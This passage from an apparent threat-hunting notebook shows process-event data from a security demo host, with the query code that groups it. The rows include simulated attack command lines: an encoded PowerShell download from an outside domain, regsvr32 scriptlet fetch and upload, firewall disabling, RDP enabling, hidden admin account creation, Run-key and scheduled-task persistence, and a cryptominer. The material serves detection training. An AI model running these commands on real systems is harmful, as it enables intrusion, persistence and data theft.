      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.dataresource+json": {
       "data": [
        {
         "Account": "-\\-",
         "CommandLine": "",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\autochk.exe"
        },
        {
         "Account": "-\\-",
         "CommandLine": "",
         "Count": 4,
         "NewProcessName": "C:\\Windows\\System32\\csrss.exe"
        },
        {
         "Account": "-\\-",
         "CommandLine": "",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\lsass.exe"
        },
        {
         "Account": "-\\-",
         "CommandLine": "",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\services.exe"
        },
        {
         "Account": "-\\-",
         "CommandLine": "",
         "Count": 6,
         "NewProcessName": "C:\\Windows\\System32\\smss.exe"
        },
        {
         "Account": "-\\-",
         "CommandLine": "",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\wininit.exe"
        },
        {
         "Account": "-\\-",
         "CommandLine": "",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\winlogon.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Program Files (x86)\\Internet Explorer\\IEXPLORE.EXE\" SCODEF:30680 CREDAT:82945 /prefetch:2",
         "Count": 1,
         "NewProcessName": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Program Files (x86)\\Internet Explorer\\IEXPLORE.EXE\" SCODEF:5820 CREDAT:82945 /prefetch:2",
         "Count": 1,
         "NewProcessName": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" ",
         "Count": 1,
         "NewProcessName": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -restart /WERRESTART",
         "Count": 1,
         "NewProcessName": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Program Files\\PuTTY\\putty.exe\" ",
         "Count": 1,
         "NewProcessName": "C:\\Program Files\\PuTTY\\putty.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "putty",
         "Count": 3,
         "NewProcessName": "C:\\Program Files\\PuTTY\\putty.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Users\\MSTICA~1\\AppData\\Local\\Temp\\4AE8A31A-6784-434D-A745-33FCB046F560\\dismhost.exe {DFC9CDCC-162E-4FE7-9FD3-81E2EBD68AA9}",
         "Count": 1,
         "NewProcessName": "C:\\Users\\MSTICA~1\\AppData\\Local\\Temp\\4AE8A31A-6784-434D-A745-33FCB046F560\\DismHost.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F",
         "Count": 1,
         "NewProcessName": "C:\\W!ndows\\System32\\cacls.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\netsh.exe   firewall set opmode mode=disable profile=all",
         "Count": 2,
         "NewProcessName": "C:\\W!ndows\\System32\\netsh.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"",
         "Count": 2,
         "NewProcessName": "C:\\W!ndows\\System32\\powershell.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==",
         "Count": 2,
         "NewProcessName": "C:\\W!ndows\\System32\\powershell.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\reg.exe  add \\hkcu\\software\\microsoft\\some\\key\\Run /v abadvalue",
         "Count": 2,
         "NewProcessName": "C:\\W!ndows\\System32\\reg.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "reg  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\"",
         "Count": 1,
         "NewProcessName": "C:\\W!ndows\\System32\\reg.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\regsvr32   /s /n /u /i:http://server/file.sct scrobj.dll",
         "Count": 1,
         "NewProcessName": "C:\\W!ndows\\System32\\regsvr32.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\regsvr32  /u /s c:\\windows\\fonts\\csrss.exe \"http://www.401k.com/upload?pass=34592389\" post",
         "Count": 2,
         "NewProcessName": "C:\\W!ndows\\System32\\regsvr32.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\rundll32.exe  /C c:\\windows\\fonts\\conhost.exe zip archive.mdb",
         "Count": 2,
         "NewProcessName": "C:\\W!ndows\\System32\\rundll32.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\suchost.exe   -a cryptonight -o bcn -u bond007.01 -p x -t 4",
         "Count": 2,
         "NewProcessName": "C:\\W!ndows\\System32\\suchost.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": ".\\tsetup.1.exe  C:\\Users\\MSTICAdmin\\AppData\\Local\\Temp\\2\\is-01DD7.tmp\\tsetup.1.0.14.tmp\" /SL5=\"$250276,19992586,423424,C:\\Users\\MSTICAdmin\\Downloads\\tsetup.1.0.14.exe",
         "Count": 2,
         "NewProcessName": "C:\\W!ndows\\System32\\tsetup.1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "c:\\windows\\fonts\\conhost.exe  zip archive.mdb",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\Fonts\\conhost.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Program Files\\PuTTY\\README.txt",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\SysWOW64\\notepad.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\CompMgmtLauncher.exe\" ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\CompMgmtLauncher.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "hostname",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\HOSTNAME.EXE"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "netstat  -an",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\NETSTAT.EXE"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "ping  127.0.0.1 -n 100 ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\PING.EXE"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\ServerManager.exe\" ",
         "Count": 3,
         "NewProcessName": "C:\\Windows\\System32\\ServerManager.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\taskmgr.exe\" /4",
         "Count": 3,
         "NewProcessName": "C:\\Windows\\System32\\Taskmgr.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" ",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "cmd  /c echo Any questions about the commands executed here then please contact one of",
         "Count": 8,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "cmd  /c echo Begin Security Demo tasks",
         "Count": 8,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "cmd  /c echo End Security Demo tasks",
         "Count": 8,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "cmd  /c echo open ftp.wh401k.org ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com",
         "Count": 8,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
         "Count": 17,
         "NewProcessName": "C:\\Windows\\System32\\conhost.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "findstr  \"abai$\"",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\findstr.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "findstr  \"www.401hk.com\"",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\findstr.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "ftp  -s:MG06.dll",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\ftp.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\compmgmt.msc\" /s",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\mmc.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\eventvwr.msc\" /s",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\mmc.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\taskschd.msc\" /s",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\mmc.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\System32\\msiexec.exe\" /i \"C:\\Users\\MSTICAdmin\\Downloads\\putty-64bit-0.70-installer.msi\" ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\msiexec.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  group \"Domain Admins\" /domain",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  localgroup Administrators",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  localgroup administrators ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  localgroup administrators abai$ /add",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  localgroup administrators abai$ /delete",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user Bob1 /domain",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user BobX /domain",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user abai$ /delete",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user abai$ [Placeholder]",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user abai$ [Placeholder] /add",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user www.401hk.com /active:yes",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user www.401hk.com /delete",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user www.401hk.com [Placeholder]",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  user www.401hk.com [Placeholder] /add",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "net  users ",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  group \"Domain Admins\" /domain",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  localgroup Administrators",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  localgroup administrators ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  localgroup administrators abai$ /add",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  localgroup administrators abai$ /delete",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user Bob1 /domain",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user BobX /domain",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ /delete",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ [Placeholder]",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com /active:yes",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com /delete",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder]",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\system32\\net1  users ",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\net1.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\System32\\NOTEPAD.EXE\" C:\\Diagnostics\\SimulateAttack.cmd",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\notepad.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\System32\\NOTEPAD.EXE\" C:\\Diagnostics\\WinBenignActivity.cmd",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\notepad.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Windows\\System32\\drivers\\etc\\hosts",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\notepad.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "schtasks.exe  /create /tn  /tr \"c:\\pagefile.exe /?\" /sc hour /mo 1 /ru \"system\" /f",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\schtasks.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "taskkill  /F /FI ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\taskkill.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "taskkill  /F /IM cmd.exe",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\taskkill.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "taskkill  /F /IM powershell.exe",
         "Count": 3,
         "NewProcessName": "C:\\Windows\\System32\\taskkill.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "tasklist",
         "Count": 3,
         "NewProcessName": "C:\\Windows\\System32\\tasklist.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "whoami",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\whoami.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\MSTICAdmin",
         "CommandLine": "C:\\Windows\\Explorer.EXE",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\explorer.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F",
         "Count": 1,
         "NewProcessName": "C:\\W!ndows\\System32\\cacls.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "reg  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\"",
         "Count": 1,
         "NewProcessName": "C:\\W!ndows\\System32\\reg.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "ping  127.0.0.1 -n 100 ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\PING.EXE"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" ",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "cmd  /c echo Any questions about the commands executed here then please contact one of",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "cmd  /c echo Begin Security Demo tasks",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "cmd  /c echo End Security Demo tasks",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\cmd.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\conhost.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "findstr  \"abai$\"",
         "Count": 2,
         "NewProcessName": "C:\\Windows\\System32\\findstr.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "findstr  \"www.401hk.com\"",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\findstr.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "findstr  'CMD'",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\findstr.exe"
        },
        {
         "Account": "MSTICAlertsWin1\\ian",
         "CommandLine": "findstr  'cmd'",
         "Count": 1,
         "NewProcessName": "C:\\Windows\\System32\\findstr.exe"
        }
       ],
       "schema": {
        "fields": [
         {
          "name": "Account",
          "type": "string"
         },
         {
          "name": "NewProcessName",
          "type": "string"
         },
         {
          "name": "CommandLine",
          "type": "string"
         },
         {
          "name": "Count",
          "type": "integer"
         }
        ],
        "pandas_version": "0.20.0",
        "primaryKey": [
         "Account",
         "NewProcessName",
         "CommandLine"
        ]
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th>Count</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Account</th>\n",
       "      <th>NewProcessName</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th rowspan=\"5\" valign=\"top\">-\\-</th>\n",
       "      <th>C:\\Windows\\System32\\autochk.exe</th>\n",
       "      <th></th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>C:\\Windows\\System32\\csrss.exe</th>\n",
       "      <th></th>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>C:\\Windows\\System32\\lsass.exe</th>\n",
       "      <th></th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>C:\\Windows\\System32\\services.exe</th>\n",
       "      <th></th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>C:\\Windows\\System32\\smss.exe</th>\n",
       "      <th></th>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <th>...</th>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"5\" valign=\"top\">WORKGROUP\\MSTICAlertsWin1$</th>\n",
       "      <th>C:\\Windows\\Temp\\CR_42BC8.tmp\\setup.exe</th>\n",
       "      <th>C:\\Windows\\TEMP\\CR_42BC8.tmp\\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=72.0.3626.109 --initial-client-data=0x1e0,0x1e4,0x1e8,0x1dc,0x1ec,0x7ff728255098,0x7ff7282550a8,0x7ff7282550b8</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>C:\\Windows\\Temp\\D398059B-A17E-43B8-95E4-8F0453629D9F\\DismHost.exe</th>\n",
       "      <th>C:\\Windows\\TEMP\\D398059B-A17E-43B8-95E4-8F0453629D9F\\dismhost.exe {5B5DC19A-0D8F-4B1F-8B28-CAE7B134263A}</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.2602_none_7ee6020e2207416d\\TiWorker.exe</th>\n",
       "      <th>C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.2602_none_7ee6020e2207416d\\TiWorker.exe -Embedding</th>\n",
       "      <td>16</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.2782_none_7ee3347222082816\\TiWorker.exe</th>\n",
       "      <th>C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.2782_none_7ee3347222082816\\TiWorker.exe -Embedding</th>\n",
       "      <td>11</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>C:\\Windows\\servicing\\TrustedInstaller.exe</th>\n",
       "      <th>C:\\Windows\\servicing\\TrustedInstaller.exe</th>\n",
       "      <td>26</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>4601 rows × 1 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                                                                                                                                                                                      Count\n",
       "Account                    NewProcessName                                                                                       CommandLine                                                                                                \n",
       "-\\-                        C:\\Windows\\System32\\autochk.exe                                                                                                                                                                                2\n",
       "                           C:\\Windows\\System32\\csrss.exe                                                                                                                                                                                  4\n",
       "                           C:\\Windows\\System32\\lsass.exe                                                                                                                                                                                  2\n",
       "                           C:\\Windows\\System32\\services.exe                                                                                                                                                                               2\n",
       "                           C:\\Windows\\System32\\smss.exe                                                                                                                                                                                   6\n",
       "...                                                                                                                                                                                                                                     ...\n",
       "WORKGROUP\\MSTICAlertsWin1$ C:\\Windows\\Temp\\CR_42BC8.tmp\\setup.exe                                                               C:\\Windows\\TEMP\\CR_42BC8.tmp\\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotat...      1\n",
       "                           C:\\Windows\\Temp\\D398059B-A17E-43B8-95E4-8F0453629D9F\\DismHost.exe                                    C:\\Windows\\TEMP\\D398059B-A17E-43B8-95E4-8F0453629D9F\\dismhost.exe {5B5DC19A-0D8F-4B1F-8B28-CAE7B1...      1\n",
       "                           C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.2602_none_7e... C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.2602_none_7e...     16\n",
       "                           C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.2782_none_7e... C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.2782_none_7e...     11\n",
       "                           C:\\Windows\\servicing\\TrustedInstaller.exe                                                            C:\\Windows\\servicing\\TrustedInstaller.exe                                                                26\n",
       "\n",
       "[4601 rows x 1 columns]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "print(\"Getting process events...\", end=\"\")\n",
    "processes_on_host = qry_prov.WindowsSecurity.list_host_processes(\n",
    "    query_range, host_name=\"MSTICAlertsWin1\"\n",
    ")\n",
    "\n",
    "md(\"Initial analysis of data set\", \"large, bold\")\n",
    "md(f\"Total processes in data set <b>{len(processes_on_host)}</b>\")\n",
    "for column in (\"Account\", \"NewProcessName\", \"CommandLine\"):\n",
    "    md(f\"Total distinct {column} in data <b>{processes_on_host[column].nunique()}</b>\")\n",
    "md(\"<hr>\")\n",
    "md(\"Try grouping by distinct Account, Process, Commandline<br> - we still have 1000s of rows!\", \"large\")\n",
